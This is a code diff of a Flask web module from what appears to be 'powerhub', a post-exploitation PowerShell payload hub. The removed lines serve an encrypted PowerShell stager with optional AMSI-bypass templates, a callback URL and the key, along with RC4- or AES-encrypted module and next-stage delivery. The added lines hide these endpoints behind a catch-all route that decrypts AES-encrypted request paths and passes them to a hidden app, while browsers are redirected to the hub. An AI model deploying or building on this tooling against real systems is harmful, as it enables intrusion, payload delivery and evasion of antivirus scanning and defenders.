@@ -1,5 +1,5 @@
-from base64 import b64encode
-from binascii import unhexlify
+from base64 import b64decode
+import binascii
 from datetime import datetime
 import logging
 import os
@@ -14,15 +14,15 @@ from werkzeug.exceptions import BadRequestKeyError
 from powerhub.env import powerhub_app as ph_app
 
 from powerhub.sql import get_clip_entry_list
-from powerhub.stager import modules, build_cradle, callback_urls, \
-        import_modules, webdav_url
+from powerhub.stager import build_cradle, import_modules
+import powerhub.stager as phst
 from powerhub.upload import save_file, get_filelist
-from powerhub.directories import UPLOAD_DIR, XDG_DATA_HOME, STATIC_DIR
+from powerhub.directories import UPLOAD_DIR, STATIC_DIR
 from powerhub.payloads import create_payload
-from powerhub.tools import encrypt_rc4, encrypt_aes, compress
+from powerhub.tools import decrypt_aes
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
-from powerhub.obfuscation import symbol_name
+from powerhub.hiddenapp import hidden_app
 from powerhub import __version__
 
 
@@ -46,50 +46,12 @@ def push_notification(msg):
                          namespace="/push-notifications")
 
 
-@app.add_app_template_filter
-def debug(msg):
-    """This is a function for debugging statements in jinja2 templates"""
-    if ph_app.args.DEBUG:
-        return msg
-    return ""
-
-
-@app.add_app_template_filter
-def nodebug(msg):
-    """This is a function for (no) debugging statements in jinja2 templates"""
-    if not ph_app.args.DEBUG:
-        return msg
-    return ""
-
-
-@app.add_app_template_filter
-def rc4encrypt(msg):
-    """This is a function for encrypting strings in jinja2 templates"""
-    return b64encode(encrypt_rc4(msg.encode(), ph_app.key)).decode()
-
-
-@app.add_app_template_filter
-def rc4byteencrypt(data):
-    """This is a function for encrypting bytes in jinja2 templates
-
-    data must be hexascii encoded.
-    """
-    encrypted = encrypt_rc4(b64encode(unhexlify(data)), ph_app.key)
-    return b64encode(encrypted).decode()
-
-
-@app.route('/')
-@requires_auth
-def index():
-    return redirect('/hub')
-
-
 @app.route('/hub')
 @requires_auth
 def hub():
     clip_entries = get_clip_entry_list(ph_app.clipboard)
     context = {
-        "modules": modules,
+        "modules": phst.modules,
         "clip_entries": clip_entries,
         "repositories": list(repositories.keys()),
         "SSL": ph_app.args.SSL_KEY is not None,
@@ -190,101 +152,30 @@ def export_clipboard():
     )
 
 
-@app.route('/m')
-def payload_m():
-    """Load a single module"""
-    if 'm' not in request.args:
-        return Response('error')
-    n = int(request.args.get('m'))
-    if n < len(modules):
-        modules[n].activate()
-        code = modules[n].code
-        if 'c' in request.args:
-            encrypted = encrypt_aes(compress(code), ph_app.key)
-            resp = b64encode(encrypted),
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>', methods=['POST', 'GET'])
+def catch_all(path):
+    # Check if requests comes from a browser
+    if not path:
+        if 'text/html' in request.headers.get('Accept', ''):
+            return redirect("/hub")
         else:
-            resp = b64encode(encrypt_aes(code, ph_app.key)),
-        return Response(
-            resp,
-            content_type='text/plain; charset=utf-8'
-        )
-    else:
-        return Response("not found")
+            return hidden_app.test_client().get('/')
 
-
-@app.route('/0')
-def payload_0():
-    """Load 0th stage"""
-
+    # Return hidden endpoint
     try:
-        clipboard_id = int(request.args.get('c'))
-        exec_clipboard_entry = ph_app.clipboard. \
-            entries[clipboard_id].content
-    except TypeError:
-        exec_clipboard_entry = ""
-    amsi_bypass = request.args.get('a', 'none')
-    amsi_template = ""
-    # prevent path traversal
-    if not (amsi_bypass == 'none'
-            or '.' in amsi_bypass
-            or '/' in amsi_bypass
-            or '\\' in amsi_bypass):
-        amsi_template = "powershell/amsi/"+amsi_bypass+".ps1"
-    context = {
-        "modules": modules,
-        "callback_url": callback_urls.get(request.args.get('t')),
-        "transport": request.args.get('t'),
-        "key": ph_app.key,
-        "amsibypass": amsi_template,
-        "symbol_name": symbol_name,
-        "exec_clipboard_entry": exec_clipboard_entry,
-        "VERSION": __version__,
-    }
-    result = render_template(
-                    "powershell/stager.ps1",
-                    **context,
-                    content_type='text/plain'
-    )
-    return result
+        path = b64decode(path)
+        path = decrypt_aes(path, ph_app.key).decode()
+        return hidden_app.test_client().get(path)
+    except (binascii.Error, ValueError):
+        abort(404)
 
 
-@app.route('/h')
-def payload_h():
-    """Load next stage of the Hub"""
-    try:
-        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
-            profile = f.read()
-    except Exception:
-        profile = ""
-    context = {
-        "modules": modules,
-        "webdav_url": webdav_url,
-        "symbol_name": symbol_name,
-        "profile": profile,
-        "transport": request.args['t'],
-    }
-    result = render_template(
-                    "powershell/powerhub.ps1",
-                    **context,
-    ).encode()
-    result = b64encode(encrypt_rc4(result, ph_app.key))
-    return Response(result, content_type='text/plain; charset=utf-8')
-
-
-@app.route('/ml')
-def hub_modules():
-    """Return list of hub modules"""
-    global modules
-    modules = import_modules()
-    context = {
-        "modules": modules,
-    }
-    result = render_template(
-                    "powershell/modules.ps1",
-                    **context,
-    ).encode()
-    result = b64encode(encrypt_aes((result), ph_app.key))
-    return Response(result, content_type='text/plain; charset=utf-8')
+@hidden_app.route('/')
+@hidden_app.route('/<path:path>', methods=['POST', 'GET'])
+def foo(path):
+    print(path)
+    return path
 
 
 @app.route('/dlcradle')
@@ -404,8 +295,7 @@ def get_repo():
 def reload_modules():
     """Reload all modules from disk"""
     try:
-        global modules
-        modules = import_modules()
+        phst.modules = import_modules()
         msg = {
             'title': "Success",
             'body': "Modules reloaded (press F5 to see them)",
